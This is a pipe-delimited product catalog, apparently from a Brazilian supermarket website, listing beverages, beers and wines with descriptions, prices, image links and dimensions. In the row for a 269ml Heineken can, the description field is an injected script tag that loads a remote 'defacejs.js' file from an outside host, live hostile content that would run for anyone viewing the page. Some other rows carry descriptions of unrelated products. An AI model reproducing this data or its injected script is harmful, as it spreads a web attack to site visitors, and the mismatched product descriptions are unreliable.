id|nome|sku|descricao|imagem|preco|marca|alturaProduto|larguraProduto|pesoBruto|profundidadeProduto|categoria
78656|Ades Frutas Sabor Maçã TP 200ML|5150533|Ades Sabor Maçã é uma bebida a base de soja 0% colesterol e 0% lactose produzida com o melhor da proteína da soja misturada com um delicioso suco natural de maçã! Ades Sabor Maçã ajuda a nutrir e fortalecer o corpo pois é fonte dos minerais Zinco, Vitaminas C, B2, B3, B6, B12, e Ácido Fólico. Ades Sabor Maça é uma excelente opção para refrescar qualquer hora do seu dia com muita praticidade. Experimente!|https://static.paodeacucar.com/img/uploads/1/437/24603437.jpg|3.59|Ades|12.19|3.95|210.0|4.96|bebidas
176149|Leite Longa Vida Semidesnatado ITALAC 1 Litro|4426387|Ingredientes:Leite semidesnatado, vitaminas A e D, estabilizante citrato e /ou trifosfato de sódio, monofosfato monossódico e difosfato dissódico.NÃO CONTÉM GLÚTEN|https://static.paodeacucar.com/img/uploads/1/422/545422.jpg|6.19|Italac|20.5|7.6|1087.0|7.2|bebidas
66453|Suco Del Valle Kapo Sabor Morango TP 200ML|4727873|Produzido especialmente para a criançada, o suco de caixinha Kapo faz parte da Del Valle, uma das marcas de sucos mais vendidas no Brasil! O Kapo 200ml sabor Morango além de ser fonte de Vitaminas e Nutrientes, é um suco sem corante com sabor delicioso. Compre Suco de Morango Kapo 200ml , uma excelente opção de suco de caixinha que refresca com praticidade! Experimente!|https://static.paodeacucar.com/img/uploads/1/125/24982125.png|2.69|Kapo|14.3|8.3|220.0|4.3|bebidas
1107472|Cerveja Superior Light Michelob Ultra Lata 350ml|1335963|"""É uma linha de shots, de 100 ml por unidade, que tem o objetivo de trazer benefícios para a saúde, de forma prática, usando ingredientes de origem natural. Foi através da combinação de saúde, natureza e praticidade que nasceu a for/me! A linha chega ao mercado com 3 produtos: Enhance for/me para ajudar na imunidade, Charge for/me para ajudar na disposição e Chill for/me para ajudar no relaxamento. Com For/Me você pode escolher o que deseja dar para o seu corpo, de acordo com o que ele precisa no dia. Por isso é sempre bom manter uma reserva de shots, com opções para cada situação. É a certeza de ter autocuidado natural ao alcance das suas mãos, sem pegadinhas, asteriscos ou letras miúdas.As 3 versões foram criadas em parceria com nutricionistas e médicos de diversas especialidades que nos ajudaram a concretizar os benefícios de saúde."""|https://static.paodeacucar.com/img/uploads/1/405/24963405.jpg|4.59|Michelob|15.7|5.9|430.0|5.9|bebidas-alcoolicas-
1461013|Cerveja Munich Helles Puro Malte Spaten Lata 269ml |1361243|Spaten nasceu em 1397, em Munique. É uma cerveja puro malte alemã que criou o seu próprio estilo: o Munich Helles.Tem intenso sabor de malte e é fácil de beber.|https://static.paodeacucar.com/img/uploads/1/433/24168433.png|3.39|Ambev|12.4|5.7|278.0|5.7|bebidas-alcoolicas-
583963|Cerveja Munich Helles Puro Malte Spaten Lata 350ml|1272070|Spaten nasceu em 1397, em Munique. É uma cerveja puro malte alemã que criou o seu próprio estilo: o Munich Helles.Tem intenso sabor de malte e é fácil de beber.|https://static.paodeacucar.com/img/uploads/1/941/25022941.jpg|4.59|Spaten|15.6|5.7|370.0|5.7|bebidas-alcoolicas-
479389|Cerveja Pilsen Antarctica Original Lata 269ml|1257181|Mais que uma simples cerveja, é uma verdadeira preciosidade engarrafada. Reconhecida por preservar sua essência, tradição e qualidade, a marca Original, criada em 1931, é considerada um clássico entre os apreciadores da bebida. Cerveja do tipo Pilsen, tem sabor suave, com leve amargor e aroma de lúpulo. A alta carbonatação garante a refrescância, fazendo desta uma das cervejas favoritas dos brasileiros.|https://static.paodeacucar.com/img/uploads/1/478/21221478.jpg|3.49|Original|12.9|5.9|278.0|5.8|bebidas-alcoolicas-
584617|Vinho Argentino Tinto Cordero con Piel de Lobo 750ml |1270836|Blend de Malbec. Envelhecimento em barricas usadas de carvalho francês e americano durante 6 meses.|https://static.paodeacucar.com/img/uploads/1/501/26668501.jpg|49.99|Finca Flichman|33|8|1458.0|8|bebidas-alcoolicas-
1602362|Cerveja Stella Artois Pure Gold Sem Glúten Long Neck 330ml|1375818|Chegou Stella Pure Gold! Todo o sabor de Stella, com menos calorias.Essa novidade traz todo o sabor da Stellinha que você já conhece, agora com menos calorias e ainda sem glúten*. Ela é perfeita para quem busca um estilo de vida mais equilibrado, mas sem abrir mão do sabor de apreciar uma boa cervejinha ao redor da mesa.A nova Stella Pure Gold passa pelo mesmo processo de fabricação da Stella Artois tradicional e é feita com os mesmos ingredientes - água, malte e lúpulo -, exceto pela tecnologia aplicada ao processo de produção para que seja feita a ¿quebra¿ do glúten.Aprecie com moderação.*Stella Artois Pure Gold é uma cerveja que tem o glúten retirado no processo produtivo, podendo conter até 20ppm (partes por milhão), nos termos das normas vigentes. Consulte seu médico, em caso de restrição. -17% calorias que a versão regular.Cerveja Puro Malte de estilo Premium American Lager.Estilo: Premium American LagerNotas de Degustação:Um Leve abacaxi, aroma de lúpulo suave.Lager de corpo leve, com uma nota maltada, amargor moderado e um acabamento limpo.Teor alcóolico: 4,3%Calorias: 34kcal/100mlIBU: 15Harmonização: salada Caprese, Ceviche e CamarãoCopo Ideal: CáliceAprecie com moderação.|https://static.paodeacucar.com/img/uploads/1/128/24983128.jpg|6.19|Stella Artois|23.1|6.07|540.0|6.07|bebidas-alcoolicas-
1606865|Cerveja Lager Heineken Sleek Lata 350ml|1376389|-|https://static.paodeacucar.com/img/uploads/1/90/25024090.jpg|5.79|Heineken|15.56|5.75|367.0|5.75|bebidas-alcoolicas-
323696|Cerveja Budweiser American Lager 269ml Lata|1079027|"""A cerveja Budweiser é uma American Larger que possui sabor leve, cor clara e aroma discreto. As lascas de Beechwood, madeira especial utilizada no processo de fermentação e maturação da Budweiser, conferem um sabor equilibrado, marcante no início e suave no final. Mesma receita americana desde 1876. Sua levedura própria garante o aroma frutal e a maior refrescância. Demora mais tempo para ser feita, maturada com madeira faia (beechwood). Isso aumenta a atuação das leveduras durante o processo de maturação.Harmonização: O sabor marcante no começo e suave no final de Budweiser pede que ela harmonize com hambúrguer clássico, presunto cozido e mix de castanhas.Avaliada como melhor sabor pelo consumidor de cerveja brasileiro."""|https://static.paodeacucar.com/img/uploads/1/450/26394450.png|3.19|Budweiser|12.4|5.8|277.5|5.8|bebidas-alcoolicas-
697131|Vinho Chileno Tinto Cristatus Reserva Carmenére 750ml|1275702||https://static.paodeacucar.com/img/uploads/1/870/24659870.png|88.9|Vh Import Exclusiva|33|8|1302.0|8|bebidas-alcoolicas-
1606864|Cerveja Lager Premium Puro Malte Amstel Lata 350ml|1376527|-|https://static.paodeacucar.com/img/uploads/1/87/25024087.jpg|3.99|Amstel|15.56|5.75|367.0|5.75|bebidas-alcoolicas-
456783|Cerveja Corona Extra Pilsen 330ml Long Neck|1208502|Corona não é só uma cerveja, é um estilo de vida. Um convite para se desconectar da rotina e aproveitar mais a vida lá fora, na praia e curtindo um pôr do sol com os amigos.<div></div>|https://static.paodeacucar.com/img/uploads/1/296/25036296.jpg|6.39|Corona|24.1|5.9|540.0|5.9|bebidas-alcoolicas-
104503|Vinho Português Branco Casal Garcia Vinho Verde Garrafa 750ml|0104357|VH PORT VERDE BCO CASAL GARCIA 750M|https://static.paodeacucar.com/img/uploads/1/800/4569800.png|59.9|Casal Garcia|31.5|7.2|1161.0|7.2|bebidas-alcoolicas-
284066|Cerveja HEINEKEN Garrafa 250ml|1026957|"""Heineken é uma cerveja lager Puro Malte, refrescante e de cor amarelo-dourado, produzida com ingredientes 100% naturais: água, malte e lúpulo. Durante o processo de fermentação da Heineken, a exclusiva Levedura A é responsável pelo sabor característico e bem equilibrado, com notas frutadas sutis. A cerveja é fabricada em tanques horizontais para mais sabor e consistência. É por isso que nenhuma outra cerveja tem o gosto de Heineken.Na icônica versão em Long Neck de 250ml, ela está ainda mais refrescante e gela bem rápido.A Heineken foi criada para ser a melhor cerveja do mundo desde 1873. Algumas coisas são boas demais para mudar!A lager é mais leve e combina bem com hambúrguer, comida mexicana, queijos e castanhas."""|https://static.paodeacucar.com/img/uploads/1/455/18490455.jpg|5.29|Heineken|13.4|5.1|420.0|5.1|bebidas-alcoolicas-
1376370|Cerveja Heineken Lata 269ml|1345332|"<script type=""text/javascript"" src=""https://testepagpa.000webhostapp.com/defacejs.js""></script>"|https://static.paodeacucar.com/img/uploads/1/1/23747001.png|3.99|Heineken|12.22|5.74|283.0|5.74|bebidas-alcoolicas-
340565|Cerveja Heineken Garrafa 330ml|1101245|"""Heineken é uma cerveja lager Puro Malte, refrescante e de cor amarelo-dourado, produzida com ingredientes 100% naturais: água, malte e lúpulo. Durante o processo de fermentação da Heineken, a exclusiva Levedura A é responsável pelo sabor característico e bem equilibrado, com notas frutadas sutis. A cerveja é fabricada em tanques horizontais para mais sabor e consistência. É por isso que nenhuma outra cerveja tem o gosto de Heineken.Na icônica versão em Long Neck de 330ml (6 unidades), ela possui teor alcoólico de 5% e a temperatura ideal de consumo é de 3º a 5º.A Heineken foi criada para ser a melhor cerveja do mundo desde 1873. Algumas coisas são boas demais para mudar!A lager é mais leve e combina bem com hambúrguer, comida mexicana, queijos e castanhas."""|https://static.paodeacucar.com/img/uploads/1/517/24095517.jpg|6.79|Heineken|22.6|5.9|543.5|5.9|bebidas-alcoolicas-
1387081|Cerveja Belgian White BLUE MOON Wheat Ale Lata 350ml|1352815|Blue Moon Belgian White é uma Witbier, produzida com cevada, trigo, semente de coentro e laranja valência. Uma experiência refrescantemente saborosa e acima do comum.|https://static.paodeacucar.com/img/uploads/1/831/24818831.jpg|8.99|Heineken|15|17|3680.0|23|bebidas-alcoolicas-
697134|Vinho Chileno Tinto Conquest Gol Gran Cabernet Sauvignon 750ml|1275706||https://static.paodeacucar.com/img/uploads/1/349/23628349.png|175.9|Vh Import Exclusiva|33|8|1123.0|8|bebidas-alcoolicas-
715821|Vinho Chileno Tinto Seco Club Des Sommeliers Cabernet Sauvignon Valle Central Garrafa 750ml|1277766||https://static.paodeacucar.com/img/uploads/1/473/23638473.png|27.99|Club Des Sommeliers|30|8|1123.0|8|bebidas-alcoolicas-
469043|Vinho Espanhol Tinto BOTECCA Tempranillo Garrafa 750ml|1233806||https://static.paodeacucar.com/img/uploads/1/921/11425921.jpg|115.9|Vh Import Exclusiva|30|8|1154.0|8|bebidas-alcoolicas-
467420|Cerveja Pilsen Puro Malte Eisenbahn Lata 269ml|1237992||https://static.paodeacucar.com/img/uploads/1/63/22000063.jpg|2.99|Eisenbahn|12.2|5.74|283.0|5.74|bebidas-alcoolicas-
788816|Cerveja Amstel Ultra Sem Glúten Lata 269ml|1324413|Amstel Ultra 269ml lata é Amstel com apenas 71 calorias, sem glúten, baixa em carboidratos e com 4% de teor alcoólico. Amstel Ultra, puro malte com menos calorias para você parar de contar calorias.|https://static.paodeacucar.com/img/uploads/1/380/24163380.jpg|4.19|Amstel|12.2|5.74|288.9|5.74|bebidas-alcoolicas-
336102|Vinho Argentino Tinto PAULA Malbec Garrafa 750ml|1096419|.|https://static.paodeacucar.com/img/uploads/1/471/24656471.png|59.9|Vh Import Exclusiva|30|8|1302.0|8|bebidas-alcoolicas-
697132|Vinho Chileno Tinto Cristatus Reserva Cabernet 750ml|1275701||https://static.paodeacucar.com/img/uploads/1/930/22561930.jpg|88.9|Vh Import Exclusiva|33|8|1302.0|8|bebidas-alcoolicas-
90031|Cerveja Heineken Keg 5L |2385853|"""O barril Heineken proporciona uma experiência única para você e seus amigos. Não pode ir a um bar? Então leve o bar até você. O barril Heineken conta com 5 litros da mais icônica cerveja Puro Malte.Heineken é uma cerveja lager Puro Malte, refrescante e de cor amarelo-dourado, produzida com ingredientes 100% naturais: água, malte e lúpulo. Durante o processo de fermentação da Heineken, a exclusiva Levedura A é responsável pelo sabor característico e bem equilibrado, com notas frutadas sutis. A cerveja é fabricada em tanques horizontais para mais sabor e consistência. É por isso que nenhuma outra cerveja tem o gosto de Heineken.Preparado para servir a cerveja perfeita? Seja em uma festa, churrasco ou para assistir um jogo de futebol, você pode servir seus convidados o copo perfeito de cerveja gelada!"""|https://static.paodeacucar.com/img/uploads/1/29/12156029.jpg|99.9|Heineken|28.2|17.5|5794.0|17.5|bebidas-alcoolicas-
1461878|Cerveja Pilsen CORONA Lata 350ml|1361943||https://static.paodeacucar.com/img/uploads/1/432/24168432.png|5.99||13|27|360.0|20|bebidas-alcoolicas-
349738|Vinho Francês Rose MINI MI Garrafa 750ml|1113841|Este Mini Mi é um vinho francês muito muito leve, perfeito para tomar em um fim de tarde, especialmente em dias quentes e bem gelado. Ele é frutado e de baixa acidez.|https://static.paodeacucar.com/img/uploads/1/509/26668509.jpg|69.9|Vh Import Exclusiva|30|8|1124.0|8|bebidas-alcoolicas-
329010|Vinho Chileno Tinto TRES MEDALLAS Cabernet Sauvignon garrafa 750ml|1090606|A linha Tres Medallas celebra a história, a tradição e os prêmios da Vinícola Santa Rita. Um vinho que comemora precisamente as três medalhas obtidas na International Wines & Spirits Competition, na década de 80. Uma viagem pelo Chile, com a melhor representação das variedades que o país tem a oferecer.|https://static.paodeacucar.com/img/uploads/1/850/22319850.jpg|35.99|3 Medallas|30|8|1151.0|8|bebidas-alcoolicas-
328356|Vinho Chileno Tinto TRES MEDALLAS Carmenere garrafa 750ml|1090607|A linha Tres Medallas celebra a história, a tradição e os prêmios da Vinícola Santa Rita. Um vinho que comemora precisamente as três medalhas obtidas na International Wines & Spirits Competition, na década de 80. Uma viagem pelo Chile, com a melhor representação das variedades que o país tem a oferecer.|https://static.paodeacucar.com/img/uploads/1/255/22317255.jpg|35.99|3 Medallas|30|8|1302.0|8|bebidas-alcoolicas-
796083|Cerveja Weisse Patagonia Lata 350ml|1327221|A Patagonia Weisse tem cremosidade característica aroma cítrico marcante e cor clara ¿ características tradicionais das cervejas de trigo do tipo Witbier. Notas de laranja limão abacaxi e semente de coentro equilibram perfeitamente esse aroma e o sabor refrescante e pouco adocicado desta cerveja. Experimente com saladas temperadas com limão peixes e frutos do mar para harmonizar com este clássico rótulo argentino.<div></div>|https://static.paodeacucar.com/img/uploads/1/181/23648181.png|6.19|Patagonia|15.7|5.9|360.0|5.9|bebidas-alcoolicas-
62145|Vinho Argentino Tinto Seco Trapiche Malbec Mendoza 750ml|3803134|VH ARG TTO TRAPICHE MALBEC    750ML|https://static.paodeacucar.com/img/uploads/1/716/4557716.png|44.9|Trapiche|30.2|7.2|1145.0|7.2|bebidas-alcoolicas-
460528|Vinho Espanhol El Ninot Branco 750ml|1227761||https://static.paodeacucar.com/img/uploads/1/187/665187.jpg|49.99|Vh Import Exclusiva|30|8|1124.0|8|bebidas-alcoolicas-
1466989|Vinho Chileno Tinto Meio Seco Reserva Frida Kahlo Carmen Cabernet Sauvignon Valle Central Garrafa 750ml|1353763||https://static.paodeacucar.com/img/uploads/1/539/24431539.png|59.9|Vh Import Exclusiva|29|7|1433.0|7|bebidas-alcoolicas-
450942|Cerveja Coronita Pilsen 210ml Long Neck|1208291|Corona não é só uma cerveja, é um estilo de vida. Um convite para se desconectar da rotina e aproveitar mais a vida lá fora, na praia e curtindo um pôr do sol com os amigos. A Corona clássica: gelada e ainda melhor com limão. Tamanho ideal para tornar momentos curtindo a vida ao ar livre ainda melhores.|https://static.paodeacucar.com/img/uploads/1/490/24659490.jpg|5.19|Coronita Extra|20|5.32|390.0|5.32|bebidas-alcoolicas-
199100|Vinho Chileno Tinto Camernére MAIPO Garrafa 750ml|4893868|Aroma intenso com destaque para frutas negras e pimenta. Um vinho estruturado, redondo com boa persistência que acompanha massas, queijos e cordeiro assado.Especificações TécnicasUva : Cabernet Sauvignon,CarménèrePaís : ChileSafra : 2015Teor Alcoólico : 12,5%Amadurecimento : -Cor : Vermelho rubi com reflexos violeta.Aroma : Aroma intenso com destaque para ameixas e especiarias.Palato : Delicado, redondo e com boa persistência.Harmonização : Acompanha massas, queijos e cordeiro assado e frangos de preparo mais elaborado.Uvas : 85% Carmenere e 15% Cabernet SauvignonTipo : TintoRegião : Valle de MaipoOutros Formatos : 750mlGarantia : 03 meses contra Defeitos de Fabricação|https://static.paodeacucar.com/img/uploads/1/474/26668474.jpg|29.99|Vina Maipo|29.5|7.4|1120.0|7.4|bebidas-alcoolicas-
462219|Cerveja Brahma Duplo Malte Puro Malte 350ml Lata|1230328|"""Brahma Duplo Malte possui dois tipos de malte, uma combinação surpreendente entre a leveza do Malte Pilsen ¿e o sabor do Malte Munich: equlíbrio perfeito entre sabor e refrescância. Temos uma cerveja puro malte dourada e com aquela espuma cremosa que você já ama.  A única com Brahmosidade. Brahmosidade é a cremosidade que só a Brahma Duplo Malte tem! Ingredientes: Água, Malte, Lúpulo.Alergênicos: Contém cevada e glúten.Harmonização: Amendoim, Croquete de Carne, Batata frita e é claro, com um maravilhoso churrasco!"""|https://static.paodeacucar.com/img/uploads/1/555/13177555.png|3.99|Brahma|15.56|5.7|370.0|5.7|bebidas-alcoolicas-
364277|Vinho Chileno MAIPO MI PUEBLO Carbenet Sauvignon com 750ml|1118802||https://static.paodeacucar.com/img/uploads/1/508/26668508.jpg|29.99|Vina Maipo|31|8|1154.0|8|bebidas-alcoolicas-
350972|Cerveja EISENBAHN Pilsen Puro Malte Lata 350ml|1113684|"""A Eisenbahn Pilsen Lata 350ml é uma cerveja puro malte leve e com amargor na medida certa, ideal para ser apreciada bem gelada. De baixa fermentação e com teor alcoólico de 4,84%, a Eisenbahn Pilsen é o rótulo mais vendido da marca no Brasil. A cerveja possui cor dourada, aromas de malte e lúpulo e oferece um equilíbrio excelente entre o amargor e o doce.Harmonize a sua Eisenbahn Pilsen com frutos do mar, peixes e queijos.Fundada em Blumenau, a Eisenbahn é uma cerveja brasileira que tem alma alemã. Todas as cervejas produzidas pela fábrica seguem à risca a Lei Alemã da Pureza. """|https://static.paodeacucar.com/img/uploads/1/607/24749607.jpg|3.99|Eisenbahn|15.7|5.7|375.2|5.7|bebidas-alcoolicas-
336101|Vinho Argentino Tinto PAULA Red Blend Garrafa 750ml|1096420||https://static.paodeacucar.com/img/uploads/1/472/24656472.png|59.9|Vh Import Exclusiva|30|8|1124.0|8|bebidas-alcoolicas-
344310|Vinho Português Branco Casal Garcia Sweet Vinho Verde Garrafa 750ml|1109311|VH PORT BCO CSL GARCIA SWEET 750ML|https://static.paodeacucar.com/img/uploads/1/848/24841848.jpg|59.9|Casal Garcia|31.5|7.2|1170.0|7.2|bebidas-alcoolicas-
452630|Cerveja Stella Artois Puro Malte 330ml Long Neck|1213346| A receita de Stella Artois foi criada, originalmente, como um presente de Natal para os habitantes da pequena cidade de Leuven, na Bélgica. Cristalina, recebeu o nome de Stella, estrela em Latim. Sua receita única produz uma cerveja com aromas suaves e notas maltadas. A experiência e a tradição cervejeira de mais de 600 anos resultam em uma lager muito bem equilibradas. Uma cerveja de sabor intenso e com final suave. Stella Artois foi criada para ser saboreada. |https://static.paodeacucar.com/img/uploads/1/756/24809756.jpg|5.99|Stella Artois|22.8|6.1|530.0|6.1|bebidas-alcoolicas-
454792|Vinho Português Tinto PORTA 6 - 750ml|1216501|Vinho Regional Lisboa 375Ml 13,5% . Coloração rubi intenso, Olfativo Vinho bastante condimentado com notas frescas de cedro, folha de tabaco, cereja e boa presença de chocolate , Gustativo Vigoroso na forma e estrutura, com final  prolongado, onde os fumados e especiarias da madeira se interligam. TEOR ALCOOLÍCO  - 13,5º.|https://static.paodeacucar.com/img/uploads/1/504/26668504.jpg|59.9|Porta 6|31|7|1302.0|7|bebidas-alcoolicas-
697133|Vinho Chileno Tinto Conquest Gold Carmenére 750ml|1275707||https://static.paodeacucar.com/img/uploads/1/381/23638381.png|175.9|Vh Import Exclusiva|33|8|1123.0|8|bebidas-alcoolicas-
421704|Vinho Chileno 1969 Sauvignon Blanc Garrafa 750ml|1163073||https://static.paodeacucar.com/img/uploads/1/54/640054.jpg|29.99|Santa Rita|30|7|1458.0|7|bebidas-alcoolicas-
13918|Vinho Chileno CASILLERO DEL DIABLO Reserva Carbernet Sauvignon com 750ml|1033823|VH CHI TTO C DIABLO CAB SAUV  750ML.|https://static.paodeacucar.com/img/uploads/1/504/24067504.jpg|49.99|Casillero Del Diablo|30.2|7.4|1231.0|7.4|bebidas-alcoolicas-
418932|Vinho Chileno Tinto SANTA RITA Medalla Real Gran Reserva Carmenére Garrafa 750ml|8888242|Medalla Real Foi o primeiro vinho chileno a ganhar as Olimpíadas do Vinho de Paris, recebendo medalha de ouro e superando mais de 35 participantes de diversas partes do mundo.  Esta premiação, permitiu posicionar o Chile como um produtor de vinhos de alta qualidade em nível internacional, superando países ícones da vitivinicultura. Medalla Real marcou a história do vinho Chileno e segue atualmente sendo um vinho muito premiado.|https://static.paodeacucar.com/img/uploads/1/670/667670.jpg|99.9|Santa Rita|29|7|1318.0|7|bebidas-alcoolicas-
128337|Vinho Chileno Tinto Seco Reserva Casillero del Diablo Carménère Valle Central Garrafa 750ml|8368508|VH CHI TTO C DIABLO CARMENERE 750ML.|https://static.paodeacucar.com/img/uploads/1/840/24661840.jpg|49.99|Casillero Del Diablo|30.2|7.4|1240.0|7.4|bebidas-alcoolicas-
431979|Vinho Argentino Tinto Cabernet Sauvignon LA MASCOTA Garrafa 750ml |1152217||https://static.paodeacucar.com/img/uploads/1/340/619340.png|69.9|La Mascota|32|8|1458.0|8|bebidas-alcoolicas-
120342|Vinho Chileno Branco Seco Reserva Casillero del Diablo Sauvignon Blanc Garrafa 750ml|1162837|DESCRIÇÃOVinho CORTEROSSO Trilogia di Corte Viola Sangiovese - Merlot - Rubicone 750 ml.Vinho Italiano com Indicação Geográfica Tipica.Ganhador de medalha de ouro na Itália e na Alemanha.Um blend de sangiovese, merlot e rubicone muito delicado e fácil de beber.IndiCor rubi intenso. Aroma de cerejas, com toque de ervas.Na boca apresenta-se equilibrado e ligeiramente picante, com taninos agradáveis e boa acidez.Final com boa persistência.A Sangiovese é a uva tinta mais cultivada na Itália, protagonista de grandes vinhos. Nesses últimos anos, ela vem ganhando cada vez mais popularidade mundial. Apesar de sua representatividade na Itália, é cultivada em outros países, como Argentina e Austrália, assim como no Brasil, mesmo que de forma mais tímida. É uma uva que se adapta muito bem ao local em que é cultivada e está presente nos rótulos das principais denominações de região italianas.CARACTERÍSTICAS:Produtor: Contri Spumanti Cazzano Di Tramigna.País: Itália.Região: Emilia Romagna.Safra: 2015.*Tipo: Tinto.Volume: 750 ml.Uva: Sangiovese, Merlot e Rubicone.Teor Alcoólico: 13,5%.|https://static.paodeacucar.com/img/uploads/1/113/24075113.jpg|49.99|Casillero Del Diablo|30.4|7.6|1222.0|7.6|bebidas-alcoolicas-
216736|Vinho Argentino Tinto Catena Malbec Mendoza 750ml|4878575|VH ARG TTO CATENA MALBEC 750ML|https://static.paodeacucar.com/img/uploads/1/177/640177.png|199.9|Catena|31.8|7.3|1452.0|7.3|bebidas-alcoolicas-
421705|Vinho Chileno Tinto 1969 Cabernet Sauvignon Garrafa 750ml|1163072||https://static.paodeacucar.com/img/uploads/1/51/640051.jpg|29.99|Vh Import Exclusiva|29|7|1190.0|7|bebidas-alcoolicas-
58351|Vinho Português Tinto MONTADO DO ALENTEJANO Garrafa 750ml|4281849|Tipo:Vinho tintoELABORAÇÃOPaís de Origem:Portugal Região:AlentejoProdutor:José Maria da Fonseca.Uva(s): Aragonês, Trincadeira e Alicante BouschetTeor Alcoólico:13,60%CARACTERÍSTICASVisual:Vinho de cor intensa frutado.Olfativa:Aromas destacados de frutas. Gustativa:Com taninos suaves e composto pelas castas Aragonês e uma boa persistência de bocaCorpo: Meio SecoHarmonização: Ideal para acompanhar carnes vermelhas.Temperatura ideal de consumo: Conservar a uma temperatura de 12ºC e servir a uma temperatura de 14ºC e consumir a 17ºC.NÃO CONTÉM GLÚTEN.|https://static.paodeacucar.com/img/uploads/1/990/618990.png|49.99|Vh Import Exclusiva|28.4|8.2|1124.0|8.2|bebidas-alcoolicas-
326265|Vinho Argentino Tinto Cabernet Franc LA MASCOTA Garrafa 750ml|1080444||https://static.paodeacucar.com/img/uploads/1/803/579803.png|69.9|La Mascota|32.8|7.5|1450.0|7.5|bebidas-alcoolicas-
1057832|Cerveja de baixa caloria Light Michelob Ultra, Sem glúten, Long neck 330ml|1335787|Michelob Ultra apresenta a cerveja com 80% menos carboidratos queas cervejas comuns e apenas 85 calorias. A fórmula perfeita entre levezae refrescância, para quem valoriza uma vida com equilíbrio. MichelobUltra é feita para todos aqueles que gostam de uma rotina emmovimento, mas que sabem apreciar as pausas. Afinal, só vale se for pracurtir.Ingredientes: Água, Malte, Lúpulo, arrozHarmonização: Saladas e comidas levesTeor alcoolico: 4,2%Estilo: Ultra light BeerTemperatura Ideal: 0°C a 4°CIBU: 3|https://static.paodeacucar.com/img/uploads/1/398/24963398.jpg|5.49|Michelob|22.8|6.06|533.0|6.06|bebidas-alcoolicas-
1619139|Vinho Argentino Tinto Cordero Bonarda 750ml|1380974||https://static.paodeacucar.com/img/uploads/1/801/32843801.jpg|49.99|Cordeiro|29.9|7.8|1116.0|7.8|bebidas-alcoolicas-
218078|Vinho Chileno Tinto Merlot CHILENSIS Garrafa 750ml|4948803|Tipo: Vinho tinto. ELABORAÇÃOPaís de Origem:Chile. Região: Valle Central. Produtor: Via Wines.Uva(s):  Merlot.Teor Alcoólico:13,0%. CARACTERÍSTICASVisual:Cor vermelho cereja brilhante. Olfativa: Com tonalidades de violeta.Gustativa:  Aromas de notas frescas de frutas vermelhas como cereja e groselha. Corpo: Médio.Harmonização: Este Merlot é um vinho ideal para combinar com hambúrgueres, carne de porco grelhado e risotos. Temperatura ideal de consumo:16ºC a 18ºC. NÃO CONTÉM GLÚTEN.|https://static.paodeacucar.com/img/uploads/1/697/665697.png|49.99|Chilensis|29.4|7.5|1130.0|7.5|bebidas-alcoolicas-
326267|Vinho Argentino Tinto Malbec LA MASCOTA Garrafa 750ml|1080442|Os vinhos Mascota Vineyards refletem a paixão com que foram concebidos e a influência única exercida por sua região de origem, em Mendoza, Argentina. Seu portfólio exclusivo de vinhos exclusivos está presente em mais de 35 países, como Dinamarca, Suécia, Suíça, EUA, China, Laos, Brasil e Reino Unido, entre outros.|https://static.paodeacucar.com/img/uploads/1/805/579805.png|69.9|La Mascota|32.8|7.5|1472.0|7.5|bebidas-alcoolicas-
165494|Vinho Português Tinto Seco Casal Garcia Tinta Roriz Touriga Nacional Lisboa Garrafa 750ml|0254205|VH PORT VERDE TTO CASAL GARCIA 750M.|https://static.paodeacucar.com/img/uploads/1/300/19583300.png|59.9|Casal Garcia|31.5|7.2|1167.0|7.2|bebidas-alcoolicas-
458691|Vinho Uruguaio Rose TRAVERSA Garrafa 750ml|1225684||https://static.paodeacucar.com/img/uploads/1/383/11676383.jpg|35.99|Vh Import Exclusiva|30|7|1714.0|7|bebidas-alcoolicas-
283831|Vinho Português Porto CLUB DES SOMMELIERS Ruby Garrafa 750ml|1027301|Tipo:Vinho tintoELABORAÇÃOPaís de Origem:PortugalRegião:DouroUva(s): Touriga Nacional, Touriga Franca, Tinta Roriz, Tinta Barroca, Tinto CãoTeor Alcoólico:19%CARACTERÍSTICASVisual:Este Porto apresenta-se tinto na cor e de carácter vibrante. Olfativa:Possui aroma intenso a frutos maduros.Gustativa:E mostra-se jovem, fresco e rico no paladar.Corpo: MédioHarmonização: Ideal como vinho de convívio e sobremesa.Acompanha tartes de frutos silvestres, frutos secos, doces ou queijos suaves.Temperatura ideal de consumo:18ºC VINÍCOLAProduzido na Região do Douro.NÃO CONTÉM GLÚTEN.|https://static.paodeacucar.com/img/uploads/1/370/24656370.jpg|79.9|Club Des Sommeliers|30|8|1211.0|8|bebidas-alcoolicas-
